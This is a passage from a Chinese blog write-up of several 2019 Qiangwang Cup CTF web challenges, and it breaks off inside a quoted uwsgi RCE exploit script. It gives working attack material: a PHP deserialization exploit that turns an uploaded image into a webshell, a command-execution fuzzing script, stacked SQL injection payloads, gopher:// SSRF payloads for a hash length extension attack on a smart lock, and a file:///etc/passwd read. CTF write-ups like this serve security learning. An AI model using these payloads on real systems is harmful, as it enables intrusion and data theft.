<li>构造序列化，实例化Register，在Register中实例化Profile，将ext设置为1，filename_tmp为上传的图片地址，filename设置为php名称，except设置为array(‘index’=&gt;’upload_img’)。</li>
<li>登录帐号，将cookie修改为构造序列化输出的并base64编码的数据，直接请求触发就可以触发漏洞。</li>
</ol>
<p>这里直接贴exp</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">web</span>\<span class="title">controller</span>;</span></span><br><span class="line"><span class="php"><span class="comment">//include('Index.php');</span></span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span>&#123;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">Profile</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $checker;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $filename_tmp;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $filename;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $ext;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $except;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload_img</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;ext) &#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">if</span>(getimagesize(<span class="keyword">$this</span>-&gt;filename_tmp)) &#123;</span></span><br><span class="line"><span class="php">                @copy(<span class="keyword">$this</span>-&gt;filename_tmp, <span class="keyword">$this</span>-&gt;filename);</span></span><br><span class="line"><span class="php">                @unlink(<span class="keyword">$this</span>-&gt;filename_tmp);</span></span><br><span class="line"><span class="php">                <span class="keyword">$this</span>-&gt;img=<span class="string">"../upload/$this-&gt;upload_menu/$this-&gt;filename"</span>;</span></span><br><span class="line"><span class="php">                <span class="keyword">$this</span>-&gt;update_img();</span></span><br><span class="line"><span class="php">            &#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="php">                <span class="keyword">$this</span>-&gt;error(<span class="string">'Forbidden type!'</span>, url(<span class="string">'../index'</span>));</span></span><br><span class="line"><span class="php">            &#125;</span></span><br><span class="line"><span class="php">        &#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">$this</span>-&gt;error(<span class="string">'Unknow file type!'</span>, url(<span class="string">'../index'</span>));</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($name)</span></span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;except[$name];</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($name, $arguments)</span></span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;&#123;$name&#125;)&#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">$this</span>-&gt;&#123;<span class="keyword">$this</span>-&gt;&#123;$name&#125;&#125;($arguments);</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">Register</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $checker;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $registed;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;checker=<span class="keyword">new</span> Index();</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">register</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;checker) &#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;checker-&gt;login_check())&#123;</span></span><br><span class="line"><span class="php">                $curr_url=<span class="string">"http://"</span>.$_SERVER[<span class="string">'HTTP_HOST'</span>].$_SERVER[<span class="string">'SCRIPT_NAME'</span>].<span class="string">"/home"</span>;</span></span><br><span class="line"><span class="php">                <span class="keyword">$this</span>-&gt;redirect($curr_url,<span class="number">302</span>);</span></span><br><span class="line"><span class="php">                <span class="keyword">exit</span>();</span></span><br><span class="line"><span class="php">            &#125;</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span> (!<span class="keyword">empty</span>(input(<span class="string">"post.username"</span>)) &amp;&amp; !<span class="keyword">empty</span>(input(<span class="string">"post.email"</span>)) &amp;&amp; !<span class="keyword">empty</span>(input(<span class="string">"post.password"</span>))) &#123;</span></span><br><span class="line"><span class="php">            $email = input(<span class="string">"post.email"</span>, <span class="string">""</span>, <span class="string">"addslashes"</span>);</span></span><br><span class="line"><span class="php">            $password = input(<span class="string">"post.password"</span>, <span class="string">""</span>, <span class="string">"addslashes"</span>);</span></span><br><span class="line"><span class="php">            $username = input(<span class="string">"post.username"</span>, <span class="string">""</span>, <span class="string">"addslashes"</span>);</span></span><br><span class="line"><span class="php">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;check_email($email)) &#123;</span></span><br><span class="line"><span class="php">                <span class="keyword">if</span> (<span class="keyword">empty</span>(db(<span class="string">"user"</span>)-&gt;where(<span class="string">"username"</span>, $username)-&gt;find()) &amp;&amp; <span class="keyword">empty</span>(db(<span class="string">"user"</span>)-&gt;where(<span class="string">"email"</span>, $email)-&gt;find())) &#123;</span></span><br><span class="line"><span class="php">                    $user_info = [<span class="string">"email"</span> =&gt; $email, <span class="string">"password"</span> =&gt; md5($password), <span class="string">"username"</span> =&gt; $username];</span></span><br><span class="line"><span class="php">                    <span class="keyword">if</span> (db(<span class="string">"user"</span>)-&gt;insert($user_info)) &#123;</span></span><br><span class="line"><span class="php">                        <span class="keyword">$this</span>-&gt;registed = <span class="number">1</span>;</span></span><br><span class="line"><span class="php">                        <span class="keyword">$this</span>-&gt;success(<span class="string">'Registed successful!'</span>, url(<span class="string">'../index'</span>));</span></span><br><span class="line"><span class="php">                    &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="php">                        <span class="keyword">$this</span>-&gt;error(<span class="string">'Registed failed!'</span>, url(<span class="string">'../index'</span>));</span></span><br><span class="line"><span class="php">                    &#125;</span></span><br><span class="line"><span class="php">                &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="php">                    <span class="keyword">$this</span>-&gt;error(<span class="string">'Account already exists!'</span>, url(<span class="string">'../index'</span>));</span></span><br><span class="line"><span class="php">                &#125;</span></span><br><span class="line"><span class="php">            &#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="php">                <span class="keyword">$this</span>-&gt;error(<span class="string">'Email illegal!'</span>, url(<span class="string">'../index'</span>));</span></span><br><span class="line"><span class="php">            &#125;</span></span><br><span class="line"><span class="php">        &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">$this</span>-&gt;error(<span class="string">'Something empty!'</span>, url(<span class="string">'../index'</span>));</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">check_email</span><span class="params">($email)</span></span>&#123;</span></span><br><span class="line"><span class="php">        $pattern = <span class="string">"/^[_a-z0-9-]+(\.[_a-z0-9-]+)*@[a-z0-9-]+(\.[a-z0-9-]+)*(\.[a-z]&#123;2,&#125;)$/"</span>;</span></span><br><span class="line"><span class="php">        preg_match($pattern, $email, $matches);</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span>(<span class="keyword">empty</span>($matches))&#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">return</span> <span class="number">0</span>;</span></span><br><span class="line"><span class="php">        &#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">return</span> <span class="number">1</span>;</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;registed)&#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">$this</span>-&gt;checker-&gt;index();</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">$check = <span class="keyword">new</span> Register();</span></span><br><span class="line"><span class="php">$check-&gt;registed=<span class="number">0</span>;</span></span><br><span class="line"><span class="php">$check-&gt;checker=<span class="keyword">new</span> Profile();</span></span><br><span class="line"><span class="php">$check-&gt;checker-&gt;except=<span class="keyword">array</span>(<span class="string">'index'</span>=&gt;<span class="string">'upload_img'</span>);</span></span><br><span class="line"><span class="php">$check-&gt;checker-&gt;ext=<span class="number">1</span>;</span></span><br><span class="line"><span class="php">$check-&gt;checker-&gt;filename_tmp=<span class="string">"./upload/da5703ef349c8b4ca65880a05514ff89/0412c29576c708cf0155e8de242169b1.png"</span>;</span></span><br><span class="line"><span class="php">$check-&gt;checker-&gt;filename=<span class="string">"./upload/da5703ef349c8b4ca65880a05514ff89/0412c29576c708cf0155e8de242169b1.php"</span>;</span></span><br><span class="line"><span class="php">$payload = base64_encode(serialize($check));</span></span><br><span class="line"><span class="php">print_r($payload);</span></span><br></pre></td></tr></table></figure>

<p>利用成功后直接将jpg文件copy为php文件，就可以触发一句话木马了（我都不知道我为何要传一个601K的文件，执行命令卡飞了）</p>
<p><img src="/2019/05/31/2019-%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86Web%E9%A2%98%E5%8F%8A%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF/8418106-198f997db8417b65.png" alt> </p>
<p><img src="/2019/05/31/2019-%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86Web%E9%A2%98%E5%8F%8A%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF/8418106-99541919517273a6.png" alt> </p>
<p>这个题目环境会有问题，再加上我本地namespace环境出了丢丢问题，成功让我丢了2血拿了4血，难受。</p>
<h3 id="0x02-高明的黑客"><a href="#0x02-高明的黑客" class="headerlink" title="0x02 高明的黑客"></a>0x02 高明的黑客</h3><p>下载<a href="http://www.tar.gz" target="_blank" rel="noopener">www.tar.gz</a>后发现是3000多个“木马”文件，简单审计一下发现虽然有很多命令执行的地方，但在此之前都已经将GET或POST参数赋空值，或者加上恒为假的if判断，在于找不到路的时候又肯定不是每个都去看的情况下，于是乎写了个脚本提取每个文件中的GET、POST参数，这些参数可能传入的是assert和eval，或者传入了system和反引号，利用本地测试判断能否命令执行，最终在测试GET参数的过程中发现其中一个能用的shell并且获得其参数，是直接命令执行的，被自己操作骚到。这里贴下跑出这个的脚本（Very easy，写了好几个一起跑的）</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line">import os</span><br><span class="line">from time import sleep</span><br><span class="line">flies = os.listdir(<span class="string">'./src'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> flies:</span><br><span class="line">	url = <span class="string">'http://127.0.0.1/src/'</span>+i</span><br><span class="line">	f = open(<span class="string">'./src/'</span>+i)</span><br><span class="line">	data = f.read()</span><br><span class="line">	f.close()</span><br><span class="line">	reg = re.compile(<span class="string">r'(?&lt;=_GET\[\').*(?=\'\])'</span>)</span><br><span class="line">	params = reg.findall(data)</span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> params:	</span><br><span class="line">		payload = url + <span class="string">'/?'</span> + j + <span class="string">'=echo 123456123456123456123456'</span></span><br><span class="line">		print payload</span><br><span class="line">		req=requests.get(payload)</span><br><span class="line">		<span class="keyword">if</span> <span class="string">'123456123456123456123456'</span> <span class="keyword">in</span> req.content:</span><br><span class="line">			print payload</span><br><span class="line">			<span class="keyword">exit</span>();</span><br></pre></td></tr></table></figure>

<p><img src="/2019/05/31/2019-%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86Web%E9%A2%98%E5%8F%8A%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF/8418106-385ff2ec17cdd5b4.png" alt><br>直接拿去环境<code>cat /flag</code>下就好了，最后捡了个第六解，这题的正解是PHP动态调用分析，就不再介绍了<br><img src="/2019/05/31/2019-%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86Web%E9%A2%98%E5%8F%8A%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF/8418106-af195b540775b21d.png" alt> </p>
<h3 id="0x03-随便注"><a href="#0x03-随便注" class="headerlink" title="0x03 随便注"></a>0x03 随便注</h3><p>如题名描述，是一道注入题（注不出来的时候一度怀疑题目名全称是不是，随便注，反正你注不出来），Fuzz一下，可以发现过滤规则<code>return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;, $inject);</code>所以就是没法通过select和’.’来读表和数据的意思咯，不过可以通过报错注入出来的数据库名（supersqli）、用户等信息（果然是随便注），所以执行的SQL语句肯定是<code>select * from supersqli.table_name where id=&#39;&#39; ;</code>一番云雨测试后，确定了这是一个堆叠注入，就是可以一次性执行多条sql语句，</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">’;<span class="keyword">show</span> <span class="keyword">tables</span> <span class="keyword">from</span> supersqli;<span class="comment">#</span></span><br></pre></td></tr></table></figure>
<p>得到所有表名，另一张表名是1919810931114514</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">’;<span class="keyword">show</span> cloumns <span class="keyword">from</span> <span class="number">1919810931114514</span>;<span class="comment">#</span></span><br></pre></td></tr></table></figure>
<p>得到了1919810931114514表中的所有列名，其中包含了flag列，最后操作的思路是，把1919810931114514表改名为words，这样在后台SQL语句不变的情况下仍然可以查询得到flag的内容，改成words前得先把words改成其他的，如果一条一条执行，那改完words题目就崩了，所以一样堆叠执行，一次性完成在1919810931114514中插入id列，words改名，1919810931114514改为words，payload如下：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">';<span class="keyword">ALTER</span> <span class="keyword">TABLE</span> <span class="string">`1919810931114514`</span> <span class="keyword">ADD</span> <span class="string">`id`</span> <span class="built_in">INT</span>(<span class="number">1</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'1'</span> <span class="keyword">AFTER</span> <span class="string">`flag`</span>;%23';<span class="keyword">alter</span>+<span class="keyword">table</span>+<span class="string">`1919810931114514`</span>+<span class="keyword">rename</span>+<span class="keyword">to</span>+<span class="string">`xxx`</span>;<span class="keyword">alter</span>+<span class="keyword">table</span>+<span class="string">`words`</span>+<span class="keyword">rename</span>+<span class="keyword">to</span>+<span class="string">`zzz`</span>;<span class="keyword">alter</span>+<span class="keyword">table</span>+<span class="string">`xxx`</span>+<span class="keyword">rename</span>+<span class="keyword">to</span>+<span class="string">`words`</span>;</span><br></pre></td></tr></table></figure>
<p>直接查询就可以得到原1919810931114514表中的内容，也就是flag了。</p>
<p><img src="/2019/05/31/2019-%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86Web%E9%A2%98%E5%8F%8A%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF/8418106-97f586831178c4a6.png" alt> </p>
<h3 id="0x04-上单"><a href="#0x04-上单" class="headerlink" title="0x04 上单"></a>0x04 上单</h3><p>thinkphp5.0.*任意代码执行，EXP一把梭就好了<br><img src="/2019/05/31/2019-%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86Web%E9%A2%98%E5%8F%8A%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF/8418106-547a629c6d103376.png" alt> </p>
<h3 id="0x05-智能门锁"><a href="#0x05-智能门锁" class="headerlink" title="0x05 智能门锁"></a>0x05 智能门锁</h3><p>(自己没图，盗了W&amp;M大兄弟们的图)<br>这题在比赛期间的思路被带错了，这里把操作写一下。在刚开始的时候非预期拿到了school那的一个流量包，出题人没加forbidden，所以访问到uploads的时候就直接列出来了，因为school做了ip限制，<br><img src="/2019/05/31/2019-%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86Web%E9%A2%98%E5%8F%8A%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF/8418106-53605ba2d1bf6418.jpg" alt><br><img src="/2019/05/31/2019-%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86Web%E9%A2%98%E5%8F%8A%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF/8418106-0707e17ce211140a.jpg" alt></p>
<p>所以进入school的时候需要设置clint-ip进行访问，当时拿到流量包的时候因为超前了，不知道有啥用……（虽然说后来也不知道有啥用），通过分析流量包我们知道了门锁的IP以及端口还有发送的数据。</p>
<p><img src="/2019/05/31/2019-%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86Web%E9%A2%98%E5%8F%8A%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF/8418106-591b16b6c207cc57.jpg" alt title="图片"><br>并且进入demo的时候，可以看到下载固件v2的地址，不过又提示说v2修复了漏洞，那意思就是说v1的有洞了，下载链接上把v2改成v1就可以下载到v1了，所以意思就是怼固件咯，下载下来的文件改后缀为zip，里面是一个hex文件，一番云雨，对web狗来说太难了，不过我们有v1的流量包了，v1和v2开门流量应该是一样的，我们只要改一个版本号就行了，如果可以篡改门锁的时间戳就可以进行重放，然后这里的签名方法是存在哈希长度扩展攻击。，我们直接拿流量包里面同步时间截的数据包去进行扩展攻击，所以payload为</p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">/get_info.php?url=gopher://<span class="number">10.2</span>.<span class="number">3.103</span>:<span class="number">2333</span>/_<span class="symbol">%26</span><span class="symbol">%02</span><span class="symbol">%FF</span><span class="symbol">%FF</span><span class="symbol">%FF</span><span class="symbol">%FF</span><span class="symbol">%FF</span><span class="symbol">%FF</span><span class="symbol">%FF</span><span class="symbol">%FF</span><span class="symbol">%FF</span><span class="symbol">%FF</span><span class="symbol">%FF</span><span class="symbol">%FF</span><span class="symbol">%FF</span><span class="symbol">%FF</span><span class="symbol">%FF</span><span class="symbol">%FF</span><span class="symbol">%FF</span><span class="symbol">%FF</span><span class="symbol">%FF</span><span class="symbol">%FF</span><span class="symbol">%FF</span><span class="symbol">%FF</span><span class="symbol">%FF</span><span class="symbol">%FF</span><span class="symbol">%FF</span><span class="symbol">%FF</span><span class="symbol">%FF</span><span class="symbol">%FF</span><span class="symbol">%FF</span><span class="symbol">%FF</span><span class="symbol">%FF</span><span class="symbol">%FF</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%12</span></span><br><span class="line">/get_info.php?url=gopher://<span class="number">10.2</span>.<span class="number">3.103</span>:<span class="number">2333</span>/_<span class="symbol">%AC</span><span class="symbol">%02</span><span class="symbol">%B5</span><span class="symbol">%5</span>E<span class="symbol">%97</span><span class="symbol">%0</span>E<span class="symbol">%D5</span><span class="symbol">%8</span>B<span class="symbol">%92</span><span class="symbol">%3</span>F<span class="symbol">%2</span>C<span class="symbol">%27</span><span class="symbol">%02</span><span class="symbol">%BD</span><span class="symbol">%C8</span><span class="symbol">%87</span><span class="symbol">%1</span>B<span class="symbol">%5</span>E<span class="symbol">%22</span><span class="symbol">%3</span>B<span class="symbol">%BA</span><span class="symbol">%B8</span><span class="symbol">%A2</span><span class="symbol">%EA</span><span class="symbol">%6</span>B<span class="symbol">%4</span>C<span class="symbol">%72</span><span class="symbol">%BD</span><span class="symbol">%D4</span><span class="symbol">%9</span>D<span class="symbol">%6</span>D<span class="symbol">%4</span>D<span class="symbol">%4</span>F<span class="symbol">%CF</span><span class="symbol">%5</span>C<span class="symbol">%CB</span><span class="symbol">%DA</span><span class="symbol">%D1</span><span class="symbol">%10</span><span class="symbol">%80</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%A8</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%04</span><span class="symbol">%66</span><span class="symbol">%2</span>D<span class="symbol">%38</span><span class="symbol">%22</span></span><br><span class="line">/get_info.php?url=gopher://<span class="number">10.2</span>.<span class="number">3.103</span>:<span class="number">2333</span>/_<span class="symbol">%28</span><span class="symbol">%02</span><span class="symbol">%70</span><span class="symbol">%C8</span><span class="symbol">%96</span><span class="symbol">%BB</span><span class="symbol">%5</span>A<span class="symbol">%A8</span><span class="symbol">%44</span><span class="symbol">%F8</span><span class="symbol">%48</span><span class="symbol">%CD</span><span class="symbol">%EE</span><span class="symbol">%8</span>C<span class="symbol">%05</span><span class="symbol">%42</span><span class="symbol">%BF</span><span class="symbol">%43</span><span class="symbol">%8</span>D<span class="symbol">%3</span>C<span class="symbol">%8</span>A<span class="symbol">%A7</span><span class="symbol">%E4</span><span class="symbol">%3</span>B<span class="symbol">%D0</span><span class="symbol">%9</span>C<span class="symbol">%E4</span><span class="symbol">%E4</span><span class="symbol">%35</span><span class="symbol">%1</span>D<span class="symbol">%B0</span><span class="symbol">%00</span><span class="symbol">%E7</span><span class="symbol">%FF</span><span class="symbol">%5</span>C<span class="symbol">%CB</span><span class="symbol">%DA</span><span class="symbol">%D2</span><span class="symbol">%20</span><span class="symbol">%01</span><span class="symbol">%F0</span></span><br></pre></td></tr></table></figure>
<h3 id="0x06-babywebbb"><a href="#0x06-babywebbb" class="headerlink" title="0x06 babywebbb"></a>0x06 babywebbb</h3><p>这题一开始路走错了（枯死），证书里写了52dandan.xyz，去年是52dandan.cc，所以肯定是个渗透题，在<a href="http://www.52dandan.xyz上扫了一波，发现了各种提权脚本，我还以为是要怼下www.52dandan.xyz，然后在内网对题目" target="_blank" rel="noopener">www.52dandan.xyz上扫了一波，发现了各种提权脚本，我还以为是要怼下www.52dandan.xyz，然后在内网对题目</a>……<br>第二天才知道原来不是<a href="http://www.52dandan.xyz，是qqwwwwbbbb.52dandan.xyz......所以改下hosts就可以访问到题目了，并且前期扫端口的时候873是开的，刚好有rsync泄漏，里面可以下载到qqwwwwbbbb.52dandan.xyz上的源码，分析源码其中graphQL的API服务存在注入，可以直接利用万能密码登录，并且user.py上有个system操作，可以直接ssrf" target="_blank" rel="noopener">www.52dandan.xyz，是qqwwwwbbbb.52dandan.xyz......所以改下hosts就可以访问到题目了，并且前期扫端口的时候873是开的，刚好有rsync泄漏，里面可以下载到qqwwwwbbbb.52dandan.xyz上的源码，分析源码其中graphQL的API服务存在注入，可以直接利用万能密码登录，并且user.py上有个system操作，可以直接ssrf</a></p>
<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line">user.route(<span class="string">'/newimg'</span>, methods=[<span class="string">'POST'</span>,<span class="string">'GET'</span>])</span><br><span class="line">@login_required</span><br><span class="line">def test():</span><br><span class="line">    url = unquote(request.form.<span class="built_in">get</span>(<span class="string">'newurl'</span>))</span><br><span class="line">    <span class="keyword">if</span> re.match(<span class="string">"^[A-Za-z0-9-_%:./]*$"</span>,url):</span><br><span class="line">        filename = ramdom_str()</span><br><span class="line">        <span class="keyword">command</span> = <span class="string">"curl &#123;&#125; &gt; /tmp/&#123;&#125;"</span>.<span class="title">format</span>(<span class="title">url</span>, <span class="title">filename</span>)</span><br><span class="line">        os.<span class="keyword">system</span>(<span class="keyword">command</span>)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">"/tmp/&#123;&#125;"</span>.<span class="built_in">format</span>(filename),<span class="string">"rb"</span>) <span class="keyword">as</span> res:</span><br><span class="line">            res_data = res.<span class="built_in">read</span>()</span><br><span class="line">            res_data = base64.b64encode(res_data)</span><br><span class="line">            <span class="literal">return</span> res_data</span><br><span class="line">    <span class="literal">return</span> <span class="string">""</span></span><br></pre></td></tr></table></figure>
<p>所以构造下注入登入，然后ssrf一波就可以读文件了</p>
<figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line">URL：<span class="string">https:</span><span class="comment">//qqwwwwbbbbb.52dandan.xyz:8088/user/newimg</span></span><br><span class="line">POST：newurl=<span class="string">file:</span><span class="comment">//etc/passwd</span></span><br></pre></td></tr></table></figure>
<p>读nigix的配置文件后知道服务器配有uwsgi服务<br><img src="/2019/05/31/2019-%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86Web%E9%A2%98%E5%8F%8A%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF/8418106-eaaba9cc243d97a9.jpg" alt title="图片"></p>
<p>github上有个uwsgi的RCE脚本</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"><span class="comment">######################</span></span><br><span class="line"><span class="comment"># Uwsgi RCE Exploit</span></span><br><span class="line"><span class="comment">######################</span></span><br><span class="line"><span class="comment"># Author: wofeiwo@80sec.com</span></span><br><span class="line"><span class="comment"># Created: 2017-7-18</span></span><br><span class="line"><span class="comment"># Last modified: 2018-1-30</span></span><br><span class="line"><span class="comment"># <span class="doctag">Note:</span> Just for research purpose</span></span><br><span class="line"></span><br><span class="line">import sys</span><br><span class="line">import socket</span><br><span class="line">import argparse</span><br><span class="line">import requests</span><br><span class="line">import urllib</span><br><span class="line"></span><br><span class="line">def sz(x):</span><br><span class="line">    s = hex(x <span 